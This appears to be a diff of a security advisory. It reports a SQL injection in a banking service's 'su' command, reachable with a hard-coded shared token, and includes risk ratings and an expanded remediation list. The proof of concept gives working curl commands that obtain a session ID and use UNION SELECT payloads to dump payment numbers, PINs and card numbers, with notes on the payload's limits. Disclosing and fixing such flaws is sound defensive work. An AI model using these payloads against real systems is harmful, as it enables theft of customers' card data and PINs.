@@ -19,7 +19,7 @@ The command is reachable through the public UUID-namespaced banking client path 
 # PoC
 
 ```bash
-TOKEN='Q5HxkocADCyPG39FBrqLvN6rtu3nSBxP'
+TOKEN='[REDACTED]'
 BASE='https://<TARGET>/banking/a0faaa38-c51f-428a-bd85-54deb308ac86'
 SID=$(curl -sk "$BASE/none&none&$TOKEN" | python3 -c "import json,sys;print(json.load(sys.stdin)['sid'])")
 ```
@@ -43,7 +43,16 @@ curl -sk "$BASE/command+su+payment_number+1%20UNION%20SELECT%201,group_concat(na
 # {"user":{"payment_number":"user,card", ...}}
 ```
 
-Confirmed extraction of all card numbers, PINs, balances; `user`=20 rows, `card`=26 rows.
+**Full dump of payment numbers + PINs and card numbers** (one row, via `group_concat`):
+
+```bash
+curl -sk "$BASE/command+su+payment_number+-1%20UNION%20SELECT%201,(SELECT%20group_concat(payment_number||':'||pin,';')%20FROM%20user),3,4,5--&$SID&$TOKEN"
+# {"user":{"payment_number":"1111111111111111:999999;2222222222222222:123456;...", ...}}
+
+curl -sk "$BASE/command+su+payment_number+-1%20UNION%20SELECT%201,(SELECT%20group_concat(card_number||':'||user_id,';')%20FROM%20card),3,4,5--&$SID&$TOKEN"
+```
+
+Confirmed extraction of all payment numbers, PINs, balances and card numbers. Row counts depend on the instance (15 `user` / 15 `card` rows on the tested instance). Note: the payload cannot contain `/` (it breaks the Django URL route and returns 404), and stacked queries are rejected by `sqlite3` (`You can only execute one statement at a time`).
 
 # Risk
 
@@ -51,16 +60,19 @@ Confirmed extraction of all card numbers, PINs, balances; `user`=20 rows, `card`
 |-----------|--------|
 | Confidentiality | Full read of the banking database: card numbers, payment numbers, PINs, balances, schema. |
 | Integrity | PINs are stored in the same DB and treated as authorization material — this defeats the PIN control. |
-| Availability | None confirmed (stacked-write not tested). |
+| Availability | None — stacked queries are rejected by the `sqlite3` driver, so the injection is limited to a single `SELECT`. |
 
 Overall severity: **High** — no web session or PIN required; an independent path to the entire banking dataset even if helper commands were removed.
 
 # Remediation
 
-1. **Use parameterised queries / ORM** in the `su` command; never concatenate `payment_number` into SQL.
-2. **Strictly type-validate** `payment_number` before query construction.
-3. **Disable detailed SQL errors** in API responses.
-4. **Remove the hard-coded shared token**; require authenticated, network-restricted callers and rotate the secret.
+1. **Use parameterised queries or safe SQLAlchemy ORM operations** — use SQLAlchemy's `text()` with bound parameters, `bindparam()`, or safe Core/ORM expressions. Never construct SQL statements through string concatenation or interpolation of untrusted input.
+2. **Enforce strict input validation** — validate input types, formats and lengths according to the expected data model. Input validation must complement parameterised queries rather than replace them.
+3. **Implement secure error handling** — return generic error messages to clients and retain diagnostic information in restricted server-side logs. Ensure that sensitive information is excluded from error responses and logs.
+4. **Remove hard-coded credentials** — use a secure server-side secret management mechanism, revoke and rotate exposed credentials, enforce authentication and authorisation, and restrict access according to deployment requirements.
+5. **Apply the principle of least privilege** — restrict database access and SQLite database file permissions to the minimum required by the banking service.
+6. **Protect sensitive banking data** — minimise sensitive information returned by the API and use appropriate secure storage mechanisms for authentication credentials.
+7. **Add regression tests** — verify parameter binding, input validation, secure error handling, access controls and the confidentiality of sensitive data.
 
 # Author
 TéléHack
